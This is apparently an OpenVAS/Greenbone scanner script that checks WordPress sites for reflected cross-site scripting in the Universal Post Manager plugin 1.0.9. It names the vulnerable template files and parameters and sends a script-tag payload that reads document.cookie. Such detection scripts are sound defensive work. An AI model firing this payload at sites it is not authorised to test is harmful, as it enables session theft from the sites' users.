CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802018" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-05-02 12:20:04 +0200 (Mon, 02 May 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "WordPress Universal Post Manager Multiple Cross Site Scripting Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/44247" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2011/Apr/190" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/100592/" );
	script_xref( name: "URL", value: "http://www.htbridge.ch/advisory/multiple_xss_in_universal_post_manager_wordpress_plugin.html" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute arbitrary
  web script or HTML in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress Universal Post Manager Plugin Version 1.0.9" );
	script_tag( name: "insight", value: "The flaws are due to input validation error in 'num' parameter
  in '/wp-content/plugins/universal-post-manager/template/email_screen_1.php'
  and '/wp-content/plugins/universal-post-manager/template/email_screen_2.php'
  and 'number' parameter in '/wp-content/plugins/universal-post-manager/templ
  ate/bookmarks_slider_h.php', which is not properly sanitized before being
  returned to the user." );
	script_tag( name: "solution", value: "Upgrade to version 1.1.1 or later." );
	script_tag( name: "summary", value: "This host is installed with WordPress Universal Post Manager
  Plugin and is prone to multiple cross-site scripting vulnerabilities." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/universal-post-manager" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/wp-content/plugins/universal-post-manager/template/bookmarks_slider_h.php?number=<script>alert(document.cookie);</script>";
if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(document\\.cookie\\);</script>", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

